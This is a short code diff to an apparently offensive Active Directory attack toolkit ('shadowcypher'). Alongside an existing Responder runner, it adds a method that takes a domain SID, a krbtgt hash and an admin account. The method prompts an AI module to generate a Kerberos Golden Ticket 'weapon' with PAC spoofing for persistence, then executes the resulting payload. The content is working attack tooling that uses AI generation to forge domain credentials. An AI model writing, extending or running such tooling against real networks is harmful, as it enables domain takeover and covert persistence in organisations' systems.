@@ -99,3 +99,13 @@ class ADAttacks:
 
         logger.info("ad", f"Running Responder on {interface}")
         return runner.execute_task(f"RESPONDER_{interface}", args, callback=on_output)
+
+    @staticmethod
+    def golden_ticket_forge(domain_sid, krbtgt_hash, domain_admin, on_output=None):
+        """2026 AI-Forged Golden Ticket: Multi-layered Kerberos persistence synthesis."""
+        from shadowcypher.modules.deephat import deephat
+        if on_output: on_output("[AD] INITIATING_GOLDEN_TICKET_SYNTHESIS...\n")
+        
+        desc = f"Forge a Kerberos Golden Ticket for domain SID {domain_sid} using krbtgt hash {krbtgt_hash}. Target user: {domain_admin}. Include PAC spoofing for 2026-level persistence."
+        filename = deephat.forge_weapon(desc, category="kerberos")
+        return deephat.execute_payload(filename, on_output=on_output)
